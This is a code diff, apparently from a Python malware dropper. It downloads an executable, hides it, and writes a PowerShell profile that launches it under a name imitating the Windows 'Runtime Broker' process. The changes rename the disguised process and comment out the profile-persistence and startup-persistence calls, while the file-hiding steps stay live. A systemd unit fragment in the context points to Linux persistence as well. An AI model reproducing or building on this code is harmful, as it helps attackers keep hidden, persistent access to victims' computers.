@@ -84,7 +84,7 @@ WantedBy=default.target""")
         directory = f"C:\\Users\\{os.getlogin()}\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1"
         with open(directory, 'w') as f:
             f.write("""# Define the process name you want to check
-    $processName = "Runtime-Broker"
+    $processName = "Runtime Broker.exe"
     
     # Define the path to the executable you want to run
     $exePath = '"""+path+"""'
@@ -131,11 +131,11 @@ WantedBy=default.target""")
             with open(file_path, 'wb') as file:
               file.write(response.content)
                 
-        try:
+        #try:
             #create_powershell_profile(file_path, "Runtime Broker")
-        except Exception as err:
-            print(err)
-            print("could not add powershell profile")
+        #except Exception as err:
+        #    print(err)
+        #    print("could not add powershell profile")
         create_hidden_file(file_path)
         create_hidden_file(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt")
         #add_to_startup(file_path, "Runtime Broker")
